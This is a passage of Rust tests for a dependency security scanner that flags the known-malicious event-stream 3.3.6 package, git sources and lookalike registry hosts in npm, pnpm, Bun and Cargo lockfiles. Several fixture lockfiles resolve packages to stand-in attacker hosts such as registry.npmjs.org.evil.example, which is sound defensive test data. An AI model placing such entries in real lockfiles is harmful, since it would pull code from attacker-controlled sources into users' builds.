                && finding.package.as_deref() == Some("event-stream")
        }));

        let bun_dir = TempDir::new().unwrap();
        fs::write(
            bun_dir.path().join("package.json"),
            r#"{"name":"demo","packageManager":"bun@1.0.0"}"#,
        )
        .unwrap();
        fs::write(
            bun_dir.path().join("bun.lock"),
            r#"{
                // Bun writes JSONC, including comments and trailing commas.
                "lockfileVersion": 1,
                "packages": {
                    "event-stream": [
                        "event-stream@3.3.6",
                        {
                            "resolved": "https://evil.example/event-stream.tgz",
                        },
                    ],
                },
            }"#,
        )
        .unwrap();

        let bun_report = scan(bun_dir.path(), &[Ecosystem::Node]).unwrap();
        assert!(bun_report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::KnownMaliciousPackage
                && finding.package.as_deref() == Some("event-stream")
        }));
        assert!(bun_report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::UntrustedDependency
                && finding.package.as_deref() == Some("event-stream")
        }));
    }

    #[test]
    fn scan_reads_cargo_lock_package_sources() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(
            temp_dir.path().join("Cargo.toml"),
            "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n[dependencies]\nremote = { git = \"https://example.com/remote.git\" }\n",
        )
        .unwrap();
        fs::write(
            temp_dir.path().join("Cargo.lock"),
            "version = 3\n\n[[package]]\nname = \"remote\"\nversion = \"1.0.0\"\nsource = \"git+https://example.com/remote.git\"\n",
        )
        .unwrap();

        let report = scan(temp_dir.path(), &[Ecosystem::Rust]).unwrap();

        assert!(report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::UntrustedDependency
                && finding.package.as_deref() == Some("remote")
        }));
        assert!(
            !report
                .findings
                .iter()
                .any(|finding| finding.kind == SecurityFindingKind::MissingLockfile)
        );
    }

    #[test]
    fn package_selector_supports_scoped_and_unscoped_names() {
        assert_eq!(
            package_name_from_selector("@scope/package@1.0.0"),
            Some("@scope/package")
        );
        assert_eq!(
            package_name_from_selector("/event-stream@3.3.6"),
            Some("event-stream")
        );
        assert_eq!(
            package_name_from_selector("/@scope/package/1.0.0"),
            Some("@scope/package")
        );
        assert_eq!(
            package_name_from_selector("/event-stream/3.3.6"),
            Some("event-stream")
        );
    }

    #[test]
    fn scoped_registry_dependencies_are_not_repository_shorthands() {
        assert!(untrusted_node_source("@scope/package").is_none());
        assert!(untrusted_node_source("@scope/package@1.0.0").is_none());
        assert_eq!(
            untrusted_node_source("owner/repository"),
            Some("repository shorthand")
        );
    }

    #[test]
    fn registry_checks_reject_lookalike_hosts_and_accept_canonical_sources() {
        assert!(is_trusted_node_registry(
            "https://registry.npmjs.org/package/-/package-1.0.0.tgz"
        ));
        assert!(!is_trusted_node_registry(
            "https://registry.npmjs.org.evil.example/package.tgz"
        ));
        assert!(!is_trusted_node_registry(
            "https://registry.yarnpkg.com.evil.example/package.tgz"
        ));
        assert!(!is_trusted_node_registry(
            "https://user@registry.npmjs.org/package.tgz"
        ));

        assert!(is_trusted_cargo_registry(
            "registry+https://github.com/rust-lang/crates.io-index"
        ));
        assert!(is_trusted_cargo_registry("sparse+https://index.crates.io/"));
        assert!(!is_trusted_cargo_registry(
            "registry+https://evil.example/crates.io/index"
        ));
        assert!(!is_trusted_cargo_registry(
            "registry+https://github.com/rust-lang/crates.io-index#evil"
        ));
    }

    #[test]
    fn bun_jsonc_parse_errors_are_reported() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(
            temp_dir.path().join("package.json"),
            r#"{"name":"demo","packageManager":"bun@1.0.0"}"#,
        )
        .unwrap();
        fs::write(temp_dir.path().join("bun.lock"), "{ /* unterminated").unwrap();

        let result = scan(temp_dir.path(), &[Ecosystem::Node]);

        assert!(
            matches!(result, Err(DustError::Manifest(message)) if message.contains("bun.lock"))
        );
    }

    #[test]
    fn malformed_supported_lockfiles_are_reported() {
        let package_lock_dir = TempDir::new().unwrap();
        fs::write(
            package_lock_dir.path().join("package.json"),
            r#"{"name":"demo","packageManager":"npm@10.0.0"}"#,
        )
        .unwrap();
        fs::write(
            package_lock_dir.path().join("package-lock.json"),
            r#"{"lockfileVersion":3,"packages":[]}"#,
        )
        .unwrap();
        assert!(matches!(
            scan(package_lock_dir.path(), &[Ecosystem::Node]),
            Err(DustError::Manifest(message)) if message.contains("package-lock.json")
        ));

        let pnpm_dir = TempDir::new().unwrap();
        fs::write(
            pnpm_dir.path().join("package.json"),
            r#"{"name":"demo","packageManager":"pnpm@9.0.0"}"#,
        )
        .unwrap();
        fs::write(pnpm_dir.path().join("pnpm-lock.yaml"), "packages: [").unwrap();
        assert!(matches!(
            scan(pnpm_dir.path(), &[Ecosystem::Node]),
            Err(DustError::Manifest(message)) if message.contains("pnpm-lock.yaml")
        ));

        let cargo_dir = TempDir::new().unwrap();
        fs::write(
            cargo_dir.path().join("Cargo.toml"),
            "[package]\nname = \"demo\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        fs::write(cargo_dir.path().join("Cargo.lock"), "package = []\n").unwrap();
        assert!(matches!(
            scan(cargo_dir.path(), &[Ecosystem::Rust]),
            Err(DustError::Manifest(message)) if message.contains("Cargo.lock")
        ));
    }

    #[test]
    fn actual_bun_package_tuples_keep_source_with_package_name() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(
            temp_dir.path().join("package.json"),
            r#"{"name":"demo","packageManager":"bun@1.3.0"}"#,
        )
        .unwrap();
        fs::write(
            temp_dir.path().join("bun.lock"),
            r#"{
                "lockfileVersion": 1,
                "packages": {
                    "@scope/package": [
                        "@scope/package@1.0.0",
                        "https://registry.npmjs.org/@scope/package/-/package-1.0.0.tgz",
                        {},
                        "sha512-example"
                    ],
                    "remote": [
                        "remote@1.0.0",
                        "https://registry.npmjs.org.evil.example/remote.tgz",
                        {},
                        "sha512-example"
                    ]
                }
            }"#,
        )
        .unwrap();

        let report = scan(temp_dir.path(), &[Ecosystem::Node]).unwrap();
        assert!(report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::UntrustedDependency
                && finding.package.as_deref() == Some("remote")
                && finding.evidence.as_deref()
                    == Some("https://registry.npmjs.org.evil.example/remote.tgz")
        }));
        assert!(!report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::UntrustedDependency
                && finding.package.as_deref() == Some("@scope/package")
        }));
    }

    #[test]
    fn pnpm_parser_handles_v9_entries_and_sources() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(
            temp_dir.path().join("package.json"),
            r#"{"name":"demo","packageManager":"pnpm@9.0.0"}"#,
        )
        .unwrap();
        fs::write(
            temp_dir.path().join("pnpm-lock.yaml"),
            "lockfileVersion: '9.0'\npackages:\n  '@scope/package@1.0.0':\n    resolution:\n      tarball: https://registry.npmjs.org/@scope/package/-/package-1.0.0.tgz\n  remote@1.0.0:\n    resolution:\n      tarball: https://registry.npmjs.org.evil.example/remote.tgz\nsnapshots:\n  remote@1.0.0: {}\n",
        )
        .unwrap();

        let report = scan(temp_dir.path(), &[Ecosystem::Node]).unwrap();
        assert!(report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::UntrustedDependency
                && finding.package.as_deref() == Some("remote")
        }));
        assert!(!report.findings.iter().any(|finding| {
            finding.kind == SecurityFindingKind::UntrustedDependency
                && finding.package.as_deref() == Some("@scope/package")
        }));
    }

    #[test]
    fn package_lock_v1_dependency_tree_is_supported() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(
            temp_dir.path().join("package.json"),
            r#"{"name":"demo","packageManager":"npm@10.0.0"}"#,
        )
        .unwrap();
        fs::write(
            temp_dir.path().join("package-lock.json"),
            r#"{
                "lockfileVersion": 1,
                "dependencies": {
                    "@scope/package": {
                        "version": "1.0.0",
                        "resolved": "https://registry.npmjs.org/@scope/package/-/package-1.0.0.tgz"
                    }
                }
            }"#,
        )
        .unwrap();

        let report = scan(temp_dir.path(), &[Ecosystem::Node]).unwrap();
        assert!(report.findings.is_empty());
        assert!(report.lockfiles.iter().any(|check| {
            check.kind == LockfileKind::PackageLockJson && check.status == LockfileStatus::Clean
        }));
    }
}
